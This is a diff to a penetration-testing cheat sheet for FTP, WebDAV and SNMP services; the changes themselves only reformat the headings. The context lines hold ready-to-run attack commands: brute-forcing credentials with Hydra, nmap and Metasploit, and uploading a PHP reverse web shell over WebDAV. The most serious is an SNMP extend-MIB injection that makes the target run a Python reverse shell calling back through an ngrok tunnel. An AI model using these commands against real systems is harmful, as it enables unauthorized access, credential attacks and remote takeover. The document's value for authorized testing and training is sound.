@@ -2,8 +2,8 @@
 
 ## Check List
 
-* [ ] _Review the applications’ configurations set across the network and validate that they are not vulnerable._
-* [ ] _Validate that used frameworks and systems are secure and not susceptible to known vulnerabilities due to unmaintained software or default settings and credentials._
+* [ ] Review the applications’ configurations set across the network and validate that they are not vulnerable.
+* [ ] Validate that used frameworks and systems are secure and not susceptible to known vulnerabilities due to unmaintained software or default settings and credentials.
 
 ## Cheat Sheet
 
@@ -11,25 +11,33 @@
 
 #### [Nmap](https://nmap.org)
 
-_Identify FTP_
+{% hint style="info" %}
+Identify FTP
+{% endhint %}
 
 ```bash
 nmap -p 21 -sS -sV --mtu 5000 --script banner $WEBSITE
 ```
 
-_Anonymous Login_
+{% hint style="info" %}
+Anonymous Login
+{% endhint %}
 
 ```bash
 nmap -p 21 -sS -sV --mtu 5000 --script ftp-anon $WEBSITE
 ```
 
-_Brute Force_
+{% hint style="info" %}
+Brute Force
+{% endhint %}
 
 ```bash
 nmap -p 21 -sS -sV --mtu 5000 --script ftp-brute $WEBSITE
 ```
 
-_Browser Login_
+{% hint style="info" %}
+Browser Login
+{% endhint %}
 
 ```bash
 ftp://anonymous:anonymous@$TARGET
@@ -37,7 +45,9 @@ ftp://anonymous:anonymous@$TARGET
 
 #### [WGET](https://www.gnu.org/software/wget/)
 
-_Download Files_
+{% hint style="info" %}
+Download Files
+{% endhint %}
 
 ```bash
 wget --ftp-user=anonymous --ftp-password=anonymous ftp://$TARGET:21
@@ -45,7 +55,9 @@ wget --ftp-user=anonymous --ftp-password=anonymous ftp://$TARGET:21
 
 #### [FTP](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/ftp)
 
-_CLI Login_
+{% hint style="info" %}
+CLI Login
+{% endhint %}
 
 ```bash
 ftp
@@ -55,25 +67,33 @@ ftp
 open $TARGET 21
 ```
 
-_USER_
+{% hint style="info" %}
+USER
+{% endhint %}
 
 ```bash
 > anonymous
 ```
 
-_PASS_
+{% hint style="info" %}
+PASS
+{% endhint %}
 
 ```bash
 > anonymous
 ```
 
-_FTP Mode_
+{% hint style="info" %}
+FTP Mode
+{% endhint %}
 
 ```bash
 passive
 ```
 
-_Download File_
+{% hint style="info" %}
+Download File
+{% endhint %}
 
 ```bash
 get file.txt
@@ -81,7 +101,9 @@ get file.txt
 
 #### [Hydra](https://github.com/vanhauser-thc/thc-hydra)
 
-_Brute Force_
+{% hint style="info" %}
+Brute Force
+{% endhint %}
 
 ```bash
 hydra -V \
@@ -91,7 +113,9 @@ hydra -V \
 
 #### [Metasploit](https://www.metasploit.com/)
 
-_Recon Version_
+{% hint style="info" %}
+Recon Version
+{% endhint %}
 
 ```bash
 msfconsole -qx "
@@ -101,7 +125,9 @@ msfconsole -qx "
     exit"
 ```
 
-_Anonymous Login_
+{% hint style="info" %}
+Anonymous Login
+{% endhint %}
 
 ```bash
 msfconsole -qx "
@@ -111,7 +137,9 @@ msfconsole -qx "
     exit"
 ```
 
-_Brute Force_
+{% hint style="info" %}
+Brute Force
+{% endhint %}
 
 ```bash
 msfconsole -qx "
@@ -126,7 +154,9 @@ msfconsole -qx "
 
 #### [Nmap](https://nmap.org/)
 
-_Identify WebDAV_
+{% hint style="info" %}
+Identify WebDAV
+{% endhint %}
 
 ```bash
 nmap -p 80,443 \
@@ -136,7 +166,9 @@ nmap -p 80,443 \
 
 #### [Metasploit](https://www.metasploit.com/)
 
-_Scan WebDAV_
+{% hint style="info" %}
+Scan WebDAV
+{% endhint %}
 
 ```bash
 msfconsole -qx "
@@ -148,7 +180,9 @@ msfconsole -qx "
 
 #### [Hydra](https://github.com/vanhauser-thc/thc-hydra)
 
-_Brute Force_
+{% hint style="info" %}
+Brute Force
+{% endhint %}
 
 ```bash
 hydra -V \
@@ -159,13 +193,17 @@ hydra -V \
 
 #### [DavTest](https://gitlab.com/kalilinux/packages/davtest)
 
-_Scan WebDAV_
+{% hint style="info" %}
+Scan WebDAV
+{% endhint %}
 
 ```bash
 davtest -url $WEBSITE
 ```
 
-_Upload Shell_
+{% hint style="info" %}
+Upload Shell
+{% endhint %}
 
 ```bash
 davtest -url $WEBSITE \
@@ -173,7 +211,9 @@ davtest -url $WEBSITE \
         -uploadloc shell.php
 ```
 
-_Listening_
+{% hint style="info" %}
+Listening
+{% endhint %}
 
 ```bash
 nc -lvnp 1234
@@ -185,13 +225,17 @@ nc -lvnp 1234
 cadaver $WEBSITE/webdav
 ```
 
-_PUT Web shell_
+{% hint style="info" %}
+PUT Web shell
+{% endhint %}
 
 ```bash
 put /usr/share/webshells/php/php-reverse-shell.php
 ```
 
-_Listening_
+{% hint style="info" %}
+Listening
+{% endhint %}
 
 ```bash
 nc -lvnp 1234
@@ -201,13 +245,17 @@ nc -lvnp 1234
 
 #### [Nmap](https://nmap.org/)
 
-_Identify SNMP_
+{% hint style="info" %}
+Identify SNMP
+{% endhint %}
 
 ```bash
 nmap -p 161 -sU -sV --mtu 5000 --script snmp-info $WEBSITE
 ```
 
-_Brute Force_
+{% hint style="info" %}
+Brute Force
+{% endhint %}
 
 ```bash
 nmap -p 161 -sU -sV --mtu 5000 --script snmp-brute $WEBSITE
@@ -215,7 +263,9 @@ nmap -p 161 -sU -sV --mtu 5000 --script snmp-brute $WEBSITE
 
 #### [SNMPWalk](https://linux.die.net/man/1/snmpwalk)
 
-_Enumerate SNMP Public_
+{% hint style="info" %}
+Enumerate SNMP Public
+{% endhint %}
 
 ```bash
 snmpwalk -v1 -c public $TARGET
@@ -223,7 +273,9 @@ snmpwalk -v1 -c public $TARGET
 
 #### [Onesixtyone](https://github.com/trailofbits/onesixtyone)
 
-_Enumerate SNMP Public_
+{% hint style="info" %}
+Enumerate SNMP Public
+{% endhint %}
 
 ```bash
 onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $TARGET
@@ -231,31 +283,41 @@ onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.
 
 #### [SNMPSet](https://linux.die.net/man/1/snmpset)
 
-_SNMPv1_
+{% hint style="info" %}
+SNMPv1
+{% endhint %}
 
 ```bash
 snmpset -v1 -c private $TARGET OID s "unk9vvn"
 ```
 
-_SNMPv2_
+{% hint style="info" %}
+SNMPv2
+{% endhint %}
 
 ```bash
 snmpset -v2c -c private $TARGET sysName.0 s "unk9vvn"
 ```
 
-_Start Ngrok_
+{% hint style="info" %}
+Start Ngrok
+{% endhint %}
 
 ```bash
 ngrok http 4444 >/dev/null 2>&1 &
 ```
 
-_Define ENV Ngrok_
+{% hint style="info" %}
+Define ENV Ngrok
+{% endhint %}
 
 ```bash
 NGHOST=$(curl -s http://127.0.0.1:4040/api/tunnels | jq -r .tunnels[0].public_url | sed 's|https://||')
 ```
 
-_Inject RCE_
+{% hint style="info" %}
+Inject RCE
+{% endhint %}
 
 ```bash
 snmpset -m +NET-SNMP-EXTEND-MIB \
@@ -263,7 +325,9 @@ snmpset -m +NET-SNMP-EXTEND-MIB \
         -c SuP3RPrivCom90 $TARGET 'nsExtendStatus."command10"' = createAndGo 'nsExtendCommand."command10"' = /usr/bin/python3 'nsExtendArgs."command10"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"$NGHOST\",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"'
 ```
 
-_Execute Command_
+{% hint style="info" %}
+Execute Command
+{% endhint %}
 
 ```bash
 snmpwalk -v2c -c SuP3RPrivCom90 $TARGET NET-SNMP-EXTEND-MIB::nsExtendObjects
@@ -271,7 +335,9 @@ snmpwalk -v2c -c SuP3RPrivCom90 $TARGET NET-SNMP-EXTEND-MIB::nsExtendObjects
 
 #### [Metasploit](https://www.metasploit.com/)
 
-_Enumerate SNMP Public_
+{% hint style="info" %}
+Enumerate SNMP Public
+{% endhint %}
 
 ```bash
 msfconsole -qx "
@@ -281,7 +347,9 @@ msfconsole -qx "
     exit"
 ```
 
-_Enumerate SNMP Private_
+{% hint style="info" %}
+Enumerate SNMP Private
+{% endhint %}
 
 ```bash
 msfconsole -qx "
@@ -292,7 +360,9 @@ msfconsole -qx "
     exit"
 ```
 
+{% hint style="info" %}
 _Enumerate Windows Users_
+{% endhint %}
 
 ```bash
 msfconsole -qx "
